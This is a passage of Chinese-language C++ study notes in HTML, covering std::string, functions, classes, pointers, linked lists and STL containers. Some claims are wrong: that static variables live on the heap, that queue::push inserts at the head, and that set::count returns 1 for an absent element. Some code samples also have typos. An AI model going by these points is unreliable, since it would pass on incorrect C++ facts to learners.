href=\"#strcmp\">#</a> strcmp()</h3>\n<p>strcmp (a, b)，比较两个字符串的大小，按照<strong>字典序</strong>方式比较</p>\n<p>字典序 (按照 ASCII 码)：abc &lt; adbe</p>\n<p><code>a &lt; b 返回-1</code></p>\n<p><code>a == b 返回0</code></p>\n<p><code>a &gt; b返回1</code></p>\n<h3 id=\"strcpy\"><a class=\"anchor\" href=\"#strcpy\">#</a> strcpy()</h3>\n<p>strcpy (a, b)，将字符串 b 复制给从 a 开始的字符数组</p>\n<h2 id=\"思想统计字符中字符出现的次数\"><a class=\"anchor\" href=\"#思想统计字符中字符出现的次数\">#</a> 思想：统计字符中字符出现的次数</h2>\n<p>开辟新的长度为 26 的数组，统计每个字幕出现的次数</p>\n<pre><code class=\"language-c++\">for(int i = 0; str[i]; i ++) //str[i]至'\\0'结束，循环也就停止  \n    cnt[str[i] - 'a'] ++;\n</code></pre>\n<h2 id=\"思想小写字母变为下一位\"><a class=\"anchor\" href=\"#思想小写字母变为下一位\">#</a> 思想：小写字母变为下一位</h2>\n<pre><code class=\"language-c++\">//c为增强for循环中设置的变量\nc = (c - 'a' + 1) % 26 + 'a';\n</code></pre>\n<h2 id=\"标准库类型string80用string处理常用\"><a class=\"anchor\" href=\"#标准库类型string80用string处理常用\">#</a> 标准库类型 String (80% 用 string 处理，常用)</h2>\n<h3 id=\"头文件\"><a class=\"anchor\" href=\"#头文件\">#</a> 头文件</h3>\n<pre><code class=\"language-c++\">//头文件\n#include&lt;string&gt;\n</code></pre>\n<h3 id=\"初始化定义\"><a class=\"anchor\" href=\"#初始化定义\">#</a> 初始化定义</h3>\n<pre><code class=\"language-c++\">string s1; //默认的空字符串\nstring s2 = s1;//s2等于s1\nstring s3 = &quot;jjj&quot;;\nstring s4(10, 'c');//s4为cccccccccc\n</code></pre>\n<h3 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h3>\n<p><strong>scanf 不能用，会报错</strong></p>\n<h4 id=\"cin-2\"><a class=\"anchor\" href=\"#cin-2\">#</a> cin</h4>\n<p><strong>过滤空格</strong></p>\n<p>cin &gt;&gt; s;</p>\n<h4 id=\"getline\"><a class=\"anchor\" href=\"#getline\">#</a> getline</h4>\n<p><strong>可读空格，可以读取一整行</strong></p>\n<p>getline(cin, s);</p>\n<h3 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h3>\n<h4 id=\"cout\"><a class=\"anchor\" href=\"#cout\">#</a> cout</h4>\n<p>cout &lt;&lt; s;</p>\n<h4 id=\"printf耗时更少\"><a class=\"anchor\" href=\"#printf耗时更少\">#</a> printf (耗时更少)</h4>\n<p><code>printf(&quot;%s\\n&quot;, s.c_str());</code></p>\n<p>c_str () 调用成员函数：返回字符数组的首地址</p>\n<h4 id=\"puts-2\"><a class=\"anchor\" href=\"#puts-2\">#</a> puts</h4>\n<p>puts(s1.c_str());</p>\n<p>c_str () 调用函数返回字符数组的首地址</p>\n<h3 id=\"empty\"><a class=\"anchor\" href=\"#empty\">#</a> empty</h3>\n<p>s.empty( )</p>\n<p>返回布尔值，s 为空返回 1，非空返回 0</p>\n<h3 id=\"size\"><a class=\"anchor\" href=\"#size\">#</a> size</h3>\n<p>s.size( )</p>\n<p>返回无符号整型的字符串长度</p>\n<p>与 strlen () 遍历一次求长的 o ( n) 时间复杂度不同，该函数时间复杂度为 o ( 1 )</p>\n<h3 id=\"string比较\"><a class=\"anchor\" href=\"#string比较\">#</a> string 比较</h3>\n<p>支持 &gt; &lt; &gt;= &lt;= == != 等所有比较操作，按字典序进行比较。</p>\n<h3 id=\"赋值\"><a class=\"anchor\" href=\"#赋值\">#</a> 赋值</h3>\n<pre><code class=\"language-c++\">s1 = s2;\n</code></pre>\n<p>给 s1 赋值为 s2 的值</p>\n<h3 id=\"相加\"><a class=\"anchor\" href=\"#相加\">#</a> 相加</h3>\n<p>必须确保每个加法运算符的两侧的运算对象<strong>至少有一个是 string</strong></p>\n<p>不能都为字符或字符串类型</p>\n<pre><code class=\"language-c++\">s3 = s1 + s2;\ns3 += s1;\n/*可以加上字符或字符串*/\ns3 = s3 + &quot;Hello&quot; + 'H';\n</code></pre>\n<h3 id=\"处理字符\"><a class=\"anchor\" href=\"#处理字符\">#</a> 处理字符</h3>\n<ul>\n<li>当成字符数组，例如可以 for 循环使用 s [i]</li>\n<li>使用增强 for 循环</li>\n</ul>\n<h1 id=\"函数\"><a class=\"anchor\" href=\"#函数\">#</a> 函数</h1>\n<h2 id=\"组成\"><a class=\"anchor\" href=\"#组成\">#</a> 组成</h2>\n<ul>\n<li>\n<p>返回类型 (必须写)、函数名字、由 0 个或多个形参组成的列表以及函数体</p>\n</li>\n<li>\n<p><strong>return 语句</strong>负责结束函数并返回一个值。不写会返回一个随机值。</p>\n</li>\n</ul>\n<h2 id=\"调用\"><a class=\"anchor\" href=\"#调用\">#</a> 调用</h2>\n<ul>\n<li>用实参初始化函数对应的形参</li>\n<li>将控制权转移给被调用函数。此时，主调函数的执行被暂时中断，被调函数开始执行。</li>\n</ul>\n<h2 id=\"声明和定义\"><a class=\"anchor\" href=\"#声明和定义\">#</a> 声明和定义</h2>\n<p>声明：没有函数体</p>\n<p>定义：必须写函数体</p>\n<h2 id=\"形参列表\"><a class=\"anchor\" href=\"#形参列表\">#</a> 形参列表</h2>\n<p>函数的形参列表可以为空，但是不能省略。</p>\n<pre><code class=\"language-c++\">void f1() &#123;/* …. */&#125;        // 隐式地定义空形参列表\nvoid f2(void) &#123;/* … */&#125;      // 显式地定义空形参列表\n</code></pre>\n<p>形参列表中的形参通常用逗号隔开，其中每个形参都是含有一个声明符的声明。即使两个形参的类型一样，也必须把两个类型都写出来：</p>\n<pre><code class=\"language-c++\">int f3(int v1, v2) &#123;/* … */&#125;       // 错误\nint f4(int v1, int v2) &#123;/* … */&#125;    // 正确\n</code></pre>\n<h2 id=\"返回类型\"><a class=\"anchor\" href=\"#返回类型\">#</a> 返回类型</h2>\n<ul>\n<li>大多数类型都可作为返回类型</li>\n<li>特殊：void—— 表示函数不返回任何值、</li>\n<li>函数的返回类型不能是数组类型或函数类型，但可以是<strong>指向数组或者函数的指针</strong>。</li>\n</ul>\n<h2 id=\"全局局部2静态变量\"><a class=\"anchor\" href=\"#全局局部2静态变量\">#</a> 全局 / 局部 / 2 静态变量</h2>\n<ul>\n<li>局部变量只可以在函数内部使用（重名时优先选择）</li>\n<li>全局变量可以在所有函数内使用</li>\n<li>static 静态，可以设置一个只在该函数内用的全局变量（节省空间，存入堆中，非栈）</li>\n</ul>\n<h2 id=\"参数传递\"><a class=\"anchor\" href=\"#参数传递\">#</a> 参数传递</h2>\n<h3 id=\"传值参数int-a\"><a class=\"anchor\" href=\"#传值参数int-a\">#</a> 传值参数（int a）</h3>\n<ul>\n<li>\n<p>初始化一个非引用类型的变量时，函数中设定的初始值被拷贝给主函数中的变量。</p>\n</li>\n<li>\n<p>在函数中对变量的改动不会影响主函数中的初始值。</p>\n</li>\n</ul>\n<h3 id=\"传引用参数int-a\"><a class=\"anchor\" href=\"#传引用参数int-a\">#</a> 传引用参数（int &amp;a）</h3>\n<ul>\n<li>当函数的形参为引用类型时，函数中对形参的修改会影响主函数中实参的值。</li>\n<li>使用引用的作用：避免拷贝、让函数返回额外信息。</li>\n</ul>\n<h3 id=\"重载\"><a class=\"anchor\" href=\"#重载\">#</a> 重载</h3>\n<p>函数名一样的情况无大碍，还取决于<strong>参数类型</strong></p>\n<h2 id=\"数组形参\"><a class=\"anchor\" href=\"#数组形参\">#</a> 数组形参</h2>\n<p><strong>传引用参数</strong></p>\n<ul>\n<li>\n<p>一维数组形参的写法：</p>\n<pre><code class=\"language-c++\">void print(int *a) &#123;/* … */&#125;\nvoid print(int a[]) &#123;/* … */&#125;\nvoid print(int a[10]) &#123;/* … */&#125;\n</code></pre>\n</li>\n<li>\n<p>多维数组形参的写法：</p>\n<p>多维数组中，除了<strong>第一维</strong>之外，其余维度的大小必须指定</p>\n<p>（c++ 中多维数组会被转化为一维数组的指针样式进行保存）</p>\n<pre><code class=\"language-c++\">void print(int (*a)[10]) &#123;/* … */&#125;\nvoid print(int a[][10]) &#123;/* … */&#125;\n</code></pre>\n</li>\n</ul>\n<h2 id=\"返回类型和return语句\"><a class=\"anchor\" href=\"#返回类型和return语句\">#</a> 返回类型和 return 语句</h2>\n<h3 id=\"两种形式\"><a class=\"anchor\" href=\"#两种形式\">#</a> 两种形式</h3>\n<pre><code class=\"language-c++\">return;\nreturn expression;\n</code></pre>\n<h3 id=\"返回类型和return语句-2\"><a class=\"anchor\" href=\"#返回类型和return语句-2\">#</a> 返回类型和 return 语句</h3>\n<p><strong>无返回值函数</strong></p>\n<ul>\n<li>没有返回值的 return 只能用在返回类型是 void 的函数中，该类函数也没必要写上 return</li>\n<li>有点类似于我们用 break 语句退出循环。</li>\n</ul>\n<p><strong>有返回值的函数</strong></p>\n<ul>\n<li>返回类型不是 void，每条 return 都必须返回一个与函数类型相同的值</li>\n</ul>\n<h2 id=\"函数递归\"><a class=\"anchor\" href=\"#函数递归\">#</a> 函数递归</h2>\n<p>函数内部可以调用函数本身</p>\n<h1 id=\"类结构体-指针引用\"><a class=\"anchor\" href=\"#类结构体-指针引用\">#</a> 类 &amp; 结构体 指针 &amp; 引用</h1>\n<h2 id=\"类\"><a class=\"anchor\" href=\"#类\">#</a> 类</h2>\n<p>类可以将变量、数组和函数完美地打包在一起</p>\n<p><strong>复杂抽象，比较庞大</strong></p>\n<ul>\n<li>\n<p>private</p>\n<p>后面的内容是私有成员变量，在类的外部不能访问</p>\n</li>\n<li>\n<p>public</p>\n<p>后面的内容是公有成员变量，在类的外部可以访问</p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">class Person &#123;\n    int age;//类默认为private\n    private:\n    \tint age, height;\n    \tdouble monney;\n    \tstring books[N];\n    public:\n    \tint get_height()\n        &#123;\n            return height;\n        &#125;\n    public:\n    \tstring name;\n\t\tvoid say()\n        &#123;\n            cout &lt;&lt; &quot;I'm&quot; &lt;&lt; endl;\n        &#125;\n    \tint get_age()\n        &#123;\n            return age;\n        &#125;\n    \tvoid add_money(double x)\n        &#123;\n            money += x;\n        &#125;\n&#125;Person1, Person2;\nint main()\n&#123;\n    Person c;\n    c.name = &quot;hxh&quot;;\n    c.age = 18;//错误！因为age是private类型的变量\n    c.add_money(10000);\n&#125;\n</code></pre>\n<h2 id=\"结构体\"><a class=\"anchor\" href=\"#结构体\">#</a> 结构体</h2>\n<p><strong>比较短，存和数据相关的</strong></p>\n<pre><code class=\"language-c++\">struct Person &#123;\n\tint age;//结构体默认是public\n&#125;;\n</code></pre>\n<h2 id=\"内存空间分配方式\"><a class=\"anchor\" href=\"#内存空间分配方式\">#</a> 内存空间分配方式</h2>\n<p>程序的进程保存在堆栈中，保存形式为<strong>十六进制</strong></p>\n<ul>\n<li>\n<p>动态数据区：</p>\n<ul>\n<li>局部变量存在<strong>栈</strong>里，未设定初值，每次分配的位置不一样，所以每次都不一样</li>\n<li>向下增长，从上往下分配</li>\n</ul>\n</li>\n<li>\n<p>静态数据区：</p>\n<ul>\n<li>全局 / 静态变量存在<strong>堆</strong>里，设定初始值为 0</li>\n<li>向上增长，从下往上分配</li>\n</ul>\n</li>\n</ul>\n<p><code>1 byte = 8 bit</code></p>\n<h2 id=\"指针\"><a class=\"anchor\" href=\"#指针\">#</a> 指针</h2>\n<p>指针指向存放变量的值的地址。因此我们可以通过指针来修改变量的值。</p>\n<pre><code class=\"language-c++\">//找到变量地址，需要转化成指针类型\nchar c = 'a';\ncout &lt;&lt; (void*)&amp;c &lt;&lt; endl;\n\n//将变量值赋给指针\nint* p = &amp;a;//(int*)类型的p的值是变量a的地址\ncout &lt;&lt; *p &lt;&lt; endl;//读取指针p指向的变量的值\n*p = a;//修改p指向的变量的值\n</code></pre>\n<h2 id=\"区别注意点\"><a class=\"anchor\" href=\"#区别注意点\">#</a> 区别 &amp; 注意点</h2>\n<ul>\n<li>\n<p>不同点在于类默认是 private，结构体默认是 public。</p>\n</li>\n<li>\n<p><strong>指针访问 -&gt;</strong></p>\n</li>\n<li>\n<p>** 普通访问 **</p>\n</li>\n<li>\n<p>new</p>\n<pre><code class=\"language-c++\">struct Node &#123;\n    int val;\n    Node* next;\n    /*构造函数初始值列表*/\n   // 结点类型(输入值) : 变量1(传值), 变量2(传值) &#123;&#125;\n    Node(int _val) : val(_val), next(nullptr) &#123;&#125;\n&#125;;\nint main()\n&#123;\n    //定义Node类型的变量，p保存的是变量地址\n    Node* p = new Node(1);\n    auto q = new Node(2);//auto自动设置，因为new Node()自动返回Node*类型\n    auto o = new Node(3);\n    //定义Node类型的变量，结点值是1\n    Node node = Node(1);\n&#125;\n</code></pre>\n</li>\n</ul>\n<h2 id=\"数组特殊的指针\"><a class=\"anchor\" href=\"#数组特殊的指针\">#</a> 数组 —— 特殊的指针</h2>\n<pre><code class=\"language-c++\">int a[5] = &#123;1, 2, 3, 4, 5&#125;;\nint *p = a;//p的值是数组a的地址\n</code></pre>\n<h2 id=\"c的引用语法\"><a class=\"anchor\" href=\"#c的引用语法\">#</a> C++ 的引用语法</h2>\n<ul>\n<li>\n<p>指针指向一块内存，内部存储的内容是所指的内存的地址</p>\n</li>\n<li>\n<p>引用是模块内存的别名，跟原来的变量实质上是同一个东西。</p>\n</li>\n<li>\n<p>指针和引用都可以作为函数参数，改变实参的值。</p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">//和指针类似，相当于给a取个别名\nint&amp; p = a;\n\nint a = 996;\nint *p = &amp;a; // p是指针, &amp;在此是求地址运算\nint &amp;r = a; // r是引用, &amp;在此起标识作用\n</code></pre>\n<h2 id=\"单链表\"><a class=\"anchor\" href=\"#单链表\">#</a> 单链表</h2>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n\nusing namespace std;\n\nstruct Node\n&#123;\n    int val;\n    Node* next;\n    \n    Node(int _val) : val(_val), next(nullptr) &#123;&#125;\n&#125;\nint main()\n&#123;\n    auto p = new Node(1);\n    auto q = new Node(2);\n    auto o = new Node(3);\n    \n    p-&gt;next = q;\n    q-&gt;next = o;\n    \n    Node* head = p;\n    /*添加结点*/\n    Node* u = new Node(4);\n    u-&gt;next = head;\n    head = u;\n    /*删除结点*/\n    head-&gt;next = head-&gt;next-&gt;next;\n    /*链表的遍历*/\n    for(Node* i = head; i; i = i-&gt;next)\n        cout &lt;&lt; i-&gt;val &lt;&lt; endl;\n   \n    return 0;\n&#125;\n</code></pre>\n<h1 id=\"stl\"><a class=\"anchor\" href=\"#stl\">#</a> STL</h1>\n<p>STL 是提高 c++ 编写效率的一个利器。</p>\n<h2 id=\"vector\"><a class=\"anchor\" href=\"#vector\">#</a> vector</h2>\n<p>vector 是<strong>变长数组</strong>，支持<strong>随机访问</strong>，<strong>不支持</strong>在任意位置 O (1) 插入。为了保证效率，元素的增删一般应该在末尾进行。</p>\n<ul>\n<li>利用倍增实现动态增长\n<ul>\n<li>长度不够时进行 1/2 拷贝，n (1/2 + 1/4 + 1/8 + ....)，平均每次时间复杂度是 o (1)</li>\n<li>定义的耗时比数组慢，使用的效率快</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"声明\"><a class=\"anchor\" href=\"#声明\">#</a> 声明</h3>\n<pre><code class=\"language-c++\">#include &lt;vector&gt; \t//头文件\nvector&lt;int&gt; a;\t\t//相当于一个长度动态变化的int数组\nvector&lt;int&gt; b[233];\t//相当于第一维长233，第二位长度动态变化的int数组\n    \nstruct rec&#123;…&#125;;\nvector&lt;rec&gt; c;\t\t//自定义的结构体类型也可以保存在vector中\n\n//二维数组\nvector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 0));\n</code></pre>\n<h3 id=\"size-2\"><a class=\"anchor\" href=\"#size-2\">#</a> size( )</h3>\n<ul>\n<li>size 函数返回 vector 的实际长度（包含的元素个数）</li>\n<li>时间复杂度都是 O (1)</li>\n<li>所有的 STL 容器都支持这个方法，含义也相同</li>\n</ul>\n<pre><code class=\"language-c++\">a.size();\n</code></pre>\n<h3 id=\"empty-2\"><a class=\"anchor\" href=\"#empty-2\">#</a> empty( )</h3>\n<ul>\n<li>empty 函数返回一个 bool 类型，表明 vector 是否为空</li>\n<li>时间复杂度都是 O (1)</li>\n<li>所有的 STL 容器都支持这两个方法，含义也相同</li>\n</ul>\n<pre><code class=\"language-c++\">a.empty;\n</code></pre>\n<h3 id=\"clear\"><a class=\"anchor\" href=\"#clear\">#</a> clear</h3>\n<ul>\n<li>clear 函数把 vector 清空，只有 0 个元素</li>\n</ul>\n<pre><code class=\"language-c++\">a.clear();\n</code></pre>\n<h3 id=\"迭代器\"><a class=\"anchor\" href=\"#迭代器\">#</a> 迭代器</h3>\n<p>迭代器就像 STL 容器的 “指针”，可以用星号 “*****”<strong> 操作符解除引用</strong>。</p>\n<pre><code class=\"language-c++\">//一个保存int的vector的迭代器声明方法为：\n//it保存a的首地址，\nvector&lt;int&gt;::iterator it = a.begin();\n</code></pre>\n<h4 id=\"begin\"><a class=\"anchor\" href=\"#begin\">#</a> begin( )</h4>\n<pre><code class=\"language-c++\">a.begin(); === &amp;a[0]\n*a.begin(); === a[0]\n</code></pre>\n<h4 id=\"end\"><a class=\"anchor\" href=\"#end\">#</a> end( )</h4>\n<ul>\n<li>\n<p>左开右闭，[begin, end)</p>\n</li>\n<li>\n<p>end 函数返回 vector 的尾部，即第 n 个元素再往后的 “边界 n + 1“。</p>\n</li>\n<li>\n<p>*a.end () 与 a [n] 都是越界访问，其中 n=a.size ()，即容器长度</p>\n</li>\n</ul>\n<h4 id=\"遍历方法\"><a class=\"anchor\" href=\"#遍历方法\">#</a> 遍历方法</h4>\n<ul>\n<li>\n<p>类似数组</p>\n<pre><code class=\"language-c++\">for(int i = 0; i &lt; a.size(); i++) cout &lt;&lt; a[i] &lt;&lt; ' ';\n//增强for循环\nfor(int x : a) cout &lt;&lt; x &lt;&lt; ' ';\n</code></pre>\n</li>\n<li>\n<p>迭代器遍历</p>\n<pre><code class=\"language-c++\">//可以用auto代替i的类型定义\nfor(vector&lt;int&gt;::iterator i = a.begin(); i != a.end(); i++) cout &lt;&lt; *i &lt;&lt; ' ';\n</code></pre>\n</li>\n</ul>\n<h4 id=\"front-back\"><a class=\"anchor\" href=\"#front-back\">#</a> front / back</h4>\n<ul>\n<li>\n<p>front 函数返回 vector 的第一个元素，等价于 * a.begin () 和 a [0]。</p>\n</li>\n<li>\n<p>back 函数返回 vector 的最后一个元素，等价于 a [a.size () – 1]，a.end () 的前一个位置。</p>\n</li>\n</ul>\n<h4 id=\"push_back-pop_back\"><a class=\"anchor\" href=\"#push_back-pop_back\">#</a> push_back() / pop_back()</h4>\n<ul>\n<li>\n<p>a.push_back (x) 把元素 x 插入到 vector a 的尾部。时间复杂度 o (1)</p>\n</li>\n<li>\n<p>b.pop_back () 删除 vector a 的最后一个元素。时间复杂度 o (1)</p>\n</li>\n</ul>\n<h2 id=\"queue\"><a class=\"anchor\" href=\"#queue\">#</a> queue</h2>\n<p>头文件 queue 主要包括循环队列 queue 和优先队列 priority_queue 两个容器。</p>\n<p><strong>先进先出</strong>的顺序</p>\n<h3 id=\"循环队列queue\"><a class=\"anchor\" href=\"#循环队列queue\">#</a> 循环队列 queue</h3>\n<h4 id=\"声明-2\"><a class=\"anchor\" href=\"#声明-2\">#</a> 声明</h4>\n<pre><code class=\"language-c++\">#include&lt;queue&gt; \t//头文件\nqueue&lt;int&gt; q;\n</code></pre>\n<h4 id=\"操作\"><a class=\"anchor\" href=\"#操作\">#</a> 操作</h4>\n<pre><code class=\"language-c++\">q.push(1);//队头插入一个元素\nq.pop();//弹出队尾元素\nq.front();//返回队头元素\nq.back();//返回队尾元素\n</code></pre>\n<h3 id=\"优先队列priority_queue\"><a class=\"anchor\" href=\"#优先队列priority_queue\">#</a> 优先队列 priority_queue</h3>\n<h4 id=\"声明-3\"><a class=\"anchor\" href=\"#声明-3\">#</a> 声明</h4>\n<pre><code class=\"language-c++\">#include&lt;queue&gt; \t//头文件\npriority_queue&lt;int&gt; q;\t\t// 大根堆(优先返回大的数)\npriority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q;\t// 小根堆(返回最小值)\npriority_queue&lt;pair&lt;int, int&gt;&gt;q;\n\nstruct rec&#123;\n    int a,b;\n    //重载小于号\n\tbool operator&lt; (const Rec&amp; t) const\n\t&#123;\n\t\treturn a &lt; t.a;//降序出列，从小到大排序，从大到小出列\n        或者\n        return a &gt; t.a;//升序排列，从大到小排序，从小到大出列\n\t&#125;;\n&#125;; \npriority_queue&lt;rec&gt; q;//结构体rec中必须重载小于号函数\n</code></pre>\n<h4 id=\"操作-2\"><a class=\"anchor\" href=\"#操作-2\">#</a> 操作</h4>\n<pre><code class=\"language-c++\">a.push(1);//插入一个数，按顺序自动调整\na.top();//取最大值\na.pop();//删除最大值\n</code></pre>\n<h4 id=\"清空队列\"><a class=\"anchor\" href=\"#清空队列\">#</a> 清空队列</h4>\n<pre><code class=\"language-c++\">q = queue&lt;int&gt;();//重新初始化\n</code></pre>\n<h2 id=\"stack\"><a class=\"anchor\" href=\"#stack\">#</a> stack</h2>\n<h3 id=\"声明-4\"><a class=\"anchor\" href=\"#声明-4\">#</a> 声明</h3>\n<pre><code class=\"language-c++\">#include &lt;stack&gt;//头文件\nstack&lt;int&gt; stk;\n</code></pre>\n<h3 id=\"操作-3\"><a class=\"anchor\" href=\"#操作-3\">#</a> 操作</h3>\n<pre><code class=\"language-c++\">int x;\nstk.push();//向栈顶插入\nstk.top();//返回栈顶元素\nstk.pop;//弹出删除栈顶元素\nq.size();\t\t//返回栈中元素的个数\nq.empty();\t\t//检查栈是否为空,若为空返回true,否则返回false\n</code></pre>\n<h2 id=\"deque\"><a class=\"anchor\" href=\"#deque\">#</a> deque</h2>\n<ul>\n<li>\n<p>双端队列 deque 是一个支持在两端高效插入或删除元素的连续线性存储空间。它就像是 vector 和 queue 的结合。</p>\n</li>\n<li>\n<p>与 vector 相比，deque 在头部增删元素仅需要 O (1) 的时间，vector 需要 o (n) 时间</p>\n</li>\n<li>\n<p>与 queue 相比，deque 像数组一样支持随机访问。</p>\n</li>\n</ul>\n<h3 id=\"声明-5\"><a class=\"anchor\" href=\"#声明-5\">#</a> 声明</h3>\n<pre><code class=\"language-c++\">#include&lt;deque&gt;;\ndeque&lt;int&gt; a;\n</code></pre>\n<h3 id=\"操作-4\"><a class=\"anchor\" href=\"#操作-4\">#</a> 操作</h3>\n<pre><code class=\"language-c++\">[] 随机访问\na.begin/end();/*返回deque的头/尾迭代器*/\na.front/back(); /*返回队头/队尾元素*/\na.push_back(1); /*从队尾入队*/\na.push_front(1); /*从队头入队*/\na.pop_back(); /*从队尾出队*/\na.pop_front(); /*从队头出队*/\na.clear(); /*清空队列*/\n</code></pre>\n<h2 id=\"set\"><a class=\"anchor\" href=\"#set\">#</a> set</h2>\n<ul>\n<li>\n<p>头文件 set 主要包括 set 和 multiset 两个容器，分别是 “有序集合” 和 “有序多重集合”</p>\n</li>\n<li>\n<p>前者的元素不能重复，而后者可以包含若干个相等的元素。</p>\n</li>\n<li>\n<p>set 和 multiset 的内部实现是一棵红黑树，它们支持的函数基本相同。</p>\n</li>\n</ul>\n<h3 id=\"声明-6\"><a class=\"anchor\" href=\"#声明-6\">#</a> 声明</h3>\n<pre><code class=\"language-c++\">#include&lt;set&gt;\nusing namespace std;\n\nset&lt;T泛型&gt; name;//定义的标准方式\nset&lt;int&gt; a;//元素不能重复\nmultiset&lt;double&gt; a;//元素可以重复\n\nstruct rec&#123;\n\tint a,b;\n\tbool operator&lt; (const Rec&amp; t) const\n\t&#123;\n\t\treturn a&lt;t.a;\n\t&#125;;//重载小于号，使其从小到大排列，默认小顶堆\n&#125;; \nset&lt;rec&gt; s;\t// 结构体rec中必须重载小于号函数\n</code></pre>\n<h3 id=\"sizeemptyclear\"><a class=\"anchor\" href=\"#sizeemptyclear\">#</a> size/empty/clear</h3>\n<p>与 vector 类似</p>\n<h3 id=\"迭代器-2\"><a class=\"anchor\" href=\"#迭代器-2\">#</a> 迭代器</h3>\n<ul>\n<li>\n<p>set 和 multiset 的迭代器称为 “双向访问迭代器”，不支持 “随机访问”，支持星号 (*) 解除引用，仅支持”++” 和 --“两个与算术相关的操作。</p>\n</li>\n<li>\n<p>设 it 是一个迭代器，例如 set&lt;int&gt;::iterator it;</p>\n</li>\n<li>\n<p>若把 it++，则 it 会指向 “下一个” 元素。这里的 “下一个” 元素是指在元素从小到大排序的结果中，排在 it 下一名的元素。同理，若把 it--，则 it 将会指向排在 “上一个” 的元素。</p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">set&lt;int&gt;::iterator it = a.begin();\nit++; it--;\n++it; --it;\n\n//遍历时常用\nfor(it = s.begin(); it != s.end(); it++)\n    printf(&quot;%d\\n&quot;, *it);//解引用\n</code></pre>\n<h3 id=\"beginend\"><a class=\"anchor\" href=\"#beginend\">#</a> begin/end</h3>\n<ul>\n<li>s.begin () 是指向集合中最小元素的迭代器。</li>\n<li>s.end () 是指向集合中<strong>最大元素的下一个位置</strong>的迭代器。换言之，就像 vector 一样，是一个 “前闭后开” 的形式。因此 --s.end () 是指向集合中最大元素的迭代器。</li>\n</ul>\n<h3 id=\"insert元素插入\"><a class=\"anchor\" href=\"#insert元素插入\">#</a> insert 元素插入</h3>\n<ul>\n<li>s.insert (x) 把一个元素 x 插入到集合 s 中</li>\n<li>时间复杂度为 O (logn)。</li>\n<li>在 set 中，若元素已存在，则不会重复插入该元素，对集合的状态无影响。</li>\n</ul>\n<h3 id=\"find\"><a class=\"anchor\" href=\"#find\">#</a> find</h3>\n<ul>\n<li>\n<p>s.find (x) 在集合 s 中查找等于 x 的元素，并返回指向该元素的迭代器。若不存在，则返回 s.end ()。</p>\n<pre><code class=\"language-c++\">if(a.find(x) == a.end()) //判断x在a中是否存在\n</code></pre>\n</li>\n<li>\n<p>时间复杂度为 O (logn)。</p>\n</li>\n</ul>\n<h3 id=\"lower_boundupper_bound\"><a class=\"anchor\" href=\"#lower_boundupper_bound\">#</a> lower_bound/upper_bound</h3>\n<ul>\n<li>s.lower_bound (x) 查找<strong>大于等于</strong> x 的元素中最小的一个，并返回指向该元素的迭代器。</li>\n<li>s.upper_bound (x) 查找<strong>大于</strong> x 的元素中最小的一个，并返回指向该元素的迭代器。</li>\n</ul>\n<h3 id=\"erase\"><a class=\"anchor\" href=\"#erase\">#</a> erase</h3>\n<ul>\n<li>设 x 是一个<strong>元素</strong>，s.erase (x) 从 s 中删除<strong>所有等于 x 的元素</strong>，时间复杂度为 O (k+logn)，其中 k 是被删除的元素个数。</li>\n<li>设 it 是一个<strong>迭代器</strong>，s.erase (it) 从 s 中<strong>删除迭代器 it 指向的元素</strong>，时间复杂度为 O (logn)</li>\n</ul>\n<h3 id=\"count\"><a class=\"anchor\" href=\"#count\">#</a> count</h3>\n<p>s.count (x) 返回集合 s 中<strong>等于 x 的元素个数</strong>，时间复杂度为 O (k +logn)，其中 k 为元素 x 的个数。</p>\n<ul>\n<li>set 不存在返回 1，存在返回 0</li>\n<li>multiset 存在返回个数</li>\n</ul>\n<h2 id=\"map\"><a class=\"anchor\" href=\"#map\">#</a> map</h2>\n<h3 id=\"声明-7\"><a class=\"anchor\" href=\"#声明-7\">#</a> 声明</h3>\n<ul>\n<li>map 容器是一个键值对 key-value 的映射，其内部实现是一棵以 key 为关键码的红黑树。</li>\n<li>Map 的 key 和 value 可以是任意类型，其中 key 必须定义小于号运算符。</li>\n</ul>\n<pre><code class=\"language-c++\">#include&lt;map&gt;\nusing namespace std;\n//程序中默认指定了std命令空间，可以省略std:\nstd::map&lt;std::string, int&gt;mymap&#123;&#123;\"emm\", 10&#125;, &#123;\"STL\", 20&#125;&#125;;\n//创建空容器 + 初始化\nmap&lt;key_type, value_type&gt; name;\n\n//此处和数组差不多\nmap&lt;int, int&gt; a;//二元组\na[1] = 2;\ncout &lt;&lt; a[1] &lt;&lt; endl;\n\nmap&lt;string, vector&lt;int&gt;&gt; a;\na[&quot;hhh&quot;] = vector&lt;int&gt;(&#123;1, 2, 3, 4&#125;);\ncout &lt;&lt; a[&quot;hhh&quot;][2] &lt;&lt; endl;\n\n//重载小于号，使从小到大排列\nstruct Node &#123;  \n\tint d, e;  \n\tbool operator &lt; (const Node x) const \n    &#123;  \n\treturn d &lt; x.d;      //从小到大排序\n    &#125;   \n    Node(int d, int e):d(d), e(e)&#123;&#125;  \n&#125;; \n</code></pre>\n<h3 id=\"sizeemptyclearbeginendcountlower_boundupper_boundmax_sizeswap\"><a class=\"anchor\" href=\"#sizeemptyclearbeginendcountlower_boundupper_boundmax_sizeswap\">#</a> size/empty/clear/begin/end/count/lower_bound/upper_bound/max_size/swap</h3>\n<p>均与 set 类似。</p>\n<h3 id=\"inserterase\"><a class=\"anchor\" href=\"#inserterase\">#</a> Insert/erase</h3>\n<p>与 set 类似，但其参数均是 pair&lt;key_type, value_type&gt;</p>\n<pre><code class=\"language-c++\">a.insert(&#123;&quot;a&quot;, &#123;&#125;&#125;);\n</code></pre>\n<h3 id=\"find-2\"><a class=\"anchor\" href=\"#find-2\">#</a> find</h3>\n<p>h.find (x) 在变量名为 h 的 map 中查找 key 为 x 的二元组，用法与 set 类似。</p>\n<pre><code class=\"language-c++\">a.find(key) == a.end()\n</code></pre>\n<h3 id=\"操作符\"><a class=\"anchor\" href=\"#操作符\">#</a> [ ] 操作符</h3>\n<ul>\n<li>\n<p>h [key] 返回 key 映射的 value 的引用，时间复杂度为 O (logn)。</p>\n</li>\n<li>\n<p>[] 操作符是 map 最吸引人的地方。我们可以很方便地通过 h 